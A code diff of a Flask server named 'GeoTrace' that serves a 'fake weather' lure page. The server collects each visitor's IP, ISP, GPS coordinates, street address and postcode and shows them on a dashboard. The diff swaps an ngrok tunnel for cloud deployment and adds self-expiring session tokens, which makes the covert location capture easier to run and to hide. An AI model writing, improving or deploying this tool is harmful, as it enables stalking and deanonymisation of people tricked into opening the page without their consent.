@@ -1,32 +1,28 @@
 """
-GeoTrace Backend Server v2
-pip install flask flask-cors pyngrok requests
+GeoTrace Backend — Railway/Render Deployment Ready
+pip install flask flask-cors requests gunicorn
 python server.py
 """
 from flask import Flask, request, jsonify, send_file
 from flask_cors import CORS
-import requests, threading, time
+import requests, threading, time, uuid, os
 
 app = Flask(__name__)
-CORS(app)
+CORS(app, origins="*")
 
-captured_locations = []
-ngrok_url = None
+# Session store — 5 min auto delete
+sessions = {}
+SESSION_TTL = 5 * 60
 
-# ── NGROK ──────────────────────────────────────────────
-def start_ngrok():
-    global ngrok_url
-    try:
-        from pyngrok import ngrok, conf
-        # conf.get_default().auth_token = "YOUR_NGROK_TOKEN"
-        tunnel = ngrok.connect(5000, "http")
-        ngrok_url = tunnel.public_url
-        print(f"\n{'='*55}")
-        print(f"  NGROK URL   : {ngrok_url}")
-        print(f"  Fake Weather: {ngrok_url}/weather")
-        print(f"{'='*55}\n")
-    except Exception as e:
-        print(f"[Ngrok] {e} — running local only")
+def cleanup_loop():
+    while True:
+        time.sleep(60)
+        now = time.time()
+        dead = [t for t, s in list(sessions.items()) if now - s["last_seen"] > SESSION_TTL]
+        for t in dead:
+            del sessions[t]
+
+threading.Thread(target=cleanup_loop, daemon=True).start()
 
 # ── IP INFO ────────────────────────────────────────────
 def get_ip_info(ip=None):
@@ -119,11 +115,18 @@ def api_reverse():
 
 @app.route("/api/ngrok-url")
 def api_ngrok_url():
-    return jsonify({"url": ngrok_url or "http://localhost:5000"})
+    return jsonify({"url": request.host_url.rstrip("/")})
+
+@app.route("/api/session")
+def api_session():
+    token = uuid.uuid4().hex
+    sessions[token] = {"captures": [], "last_seen": time.time()}
+    return jsonify({"token": token})
 
 @app.route("/api/capture", methods=["POST"])
 def api_capture():
     data = request.get_json(force=True) or {}
+    token = data.pop("token", "")
     fwd  = request.headers.get("X-Forwarded-For","")
     data["captured_ip"] = fwd.split(",")[0].strip() if fwd else request.remote_addr
     data["timestamp"]   = time.strftime("%Y-%m-%d %H:%M:%S")
@@ -160,22 +163,24 @@ def api_capture():
                 data["city"]    = ip_info.get("city","")
                 data["country"] = ip_info.get("country","")
 
-    captured_locations.append(data)
-    num = len(captured_locations)
-    print(f"\n{'='*50}")
-    print(f"  [CAPTURE #{num}] {data['timestamp']}")
-    print(f"  Method   : {data.get('method','?').upper()}")
-    print(f"  IP       : {data['captured_ip']}  ({data.get('isp','?')}) ")
-    print(f"  Location : {data.get('road','')} {data.get('city','?')}, {data.get('state','')} {data.get('country','?')}")
-    print(f"  Postcode : {data.get('postcode','?')}")
-    print(f"  Coords   : {lat}, {lon}  ±{data.get('accuracy','?')}m")
-    print(f"  Full Addr: {data.get('display','—')[:80]}")
-    print(f"{'='*50}\n")
+    if token and token in sessions:
+        sessions[token]["captures"].append(data)
+        sessions[token]["last_seen"] = time.time()
+        num = len(sessions[token]["captures"])
+    else:
+        num = 0
+
+    print(f"[CAPTURE #{num}] {data['timestamp']} | {data.get('method','?').upper()} | "
+          f"{data.get('city','?')}, {data.get('country','?')}")
     return jsonify({"status":"ok","captured":num})
 
 @app.route("/api/captures")
 def api_captures():
-    return jsonify(captured_locations)
+    token = request.args.get("token","")
+    if not token or token not in sessions:
+        return jsonify([])
+    sessions[token]["last_seen"] = time.time()
+    return jsonify(sessions[token]["captures"])
 
 # ── FAKE WEATHER PAGE ───────────────────────────────────
 FAKE_WEATHER_HTML = r"""<!DOCTYPE html>
@@ -337,11 +342,8 @@ def dashboard():
     return send_file("index.html")
 
 if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 5000))
     print("\n"+"="*55)
-    print("  GeoTrace Server v2")
-    print("="*55)
-    threading.Thread(target=start_ngrok, daemon=True).start()
-    time.sleep(2)
-    print("  Local: http://localhost:5000")
+    print(f"  GeoTrace Server — port {port}")
     print("="*55+"\n")
-    app.run(host="0.0.0.0", port=5000, debug=False)
+    app.run(host="0.0.0.0", port=port, debug=False)
